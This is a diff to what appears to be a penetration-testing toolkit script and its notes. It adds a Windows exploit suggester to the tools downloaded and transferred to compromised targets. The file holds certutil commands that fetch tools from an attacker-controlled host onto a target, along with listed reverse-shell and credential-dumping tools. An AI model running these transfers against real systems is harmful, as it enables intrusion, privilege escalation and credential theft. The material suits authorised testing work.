@@ -394,6 +394,7 @@ Useful URLs from targets:
   http://$LHOST:8000/windows/enum/winPEASx64.exe
   http://$LHOST:8000/windows/enum/PrivescCheck.ps1
   http://$LHOST:8000/windows/enum/PowerUp.ps1
+  http://$LHOST:8000/windows/enum/windows-exploit-suggester.ps1
   http://$LHOST:8000/windows/creds/Get-SiteListPassword.ps1
   http://$LHOST:8000/windows/shells/nc64.exe
   http://$LHOST:8000/windows/shells/Invoke-ConPtyShell.ps1
@@ -610,6 +611,8 @@ Step 2 - create workspace and transfer tools:
   certutil -urlcache -f http://$LHOST:8000/windows/enum/winPEASx64.exe winPEASx64.exe
   certutil -urlcache -f http://$LHOST:8000/windows/enum/PrivescCheck.ps1 PrivescCheck.ps1
   certutil -urlcache -f http://$LHOST:8000/windows/enum/PowerUp.ps1 PowerUp.ps1
+  certutil -urlcache -f http://$LHOST:8000/windows/enum/windows-exploit-suggester.ps1 windows-exploit-suggester.ps1
+  certutil -urlcache -f http://$LHOST:8000/windows/enum/windows-lpe-db.csv windows-lpe-db.csv
   certutil -urlcache -f http://$LHOST:8000/windows/shells/nc64.exe nc64.exe
 
 PowerShell download fallback:
@@ -1510,6 +1513,10 @@ echo "[+] accesschk64.exe (official signed Sysinternals zip)..."
 # live.sysinternals.com occasionally serves an EULA/redirect instead of the PE;
 # the download.sysinternals.com zip is the canonical, signed source.
 dl_zip_match windows/enum/accesschk64.exe https://download.sysinternals.com/files/AccessChk.zip '(^|/)accesschk64\.exe$'
+
+echo "[+] Windows-exploit-suggester (struttonpigeon)..."
+dl windows/enum/windows-exploit-suggester.ps1 https://raw.githubusercontent.com/struttonpigeon/Windows-exploit-suggester/main/windows-exploit-suggester-standalone.ps1
+dl windows/enum/windows-lpe-db.csv https://raw.githubusercontent.com/struttonpigeon/Windows-exploit-suggester/main/windows-lpe-db.csv
 
 banner "WINDOWS PRIVILEGE ESCALATION"
 echo "[+] GodPotato..."
@@ -2560,8 +2567,10 @@ Transfer these to Windows targets after getting a shell.
   Seatbelt.exe            .NET host survey — security config, interesting files
   SharpUp.exe             .NET privesc checks (GhostPack)
   accesschk64.exe         Sysinternals — check service/file/registry permissions
+  windows-exploit-suggester.ps1  Kernel/OS exploit suggester (needs windows-lpe-db.csv)
+  windows-lpe-db.csv      Local privilege escalation database for the exploit suggester
 
-Start with: winPEASx64.exe → PrivescCheck.ps1 → PowerUp.ps1 if services look promising
+Start with: winPEASx64.exe → PrivescCheck.ps1 → windows-exploit-suggester.ps1 → PowerUp.ps1
 EOF
 
 cat > windows/privesc/README.txt <<'EOF'
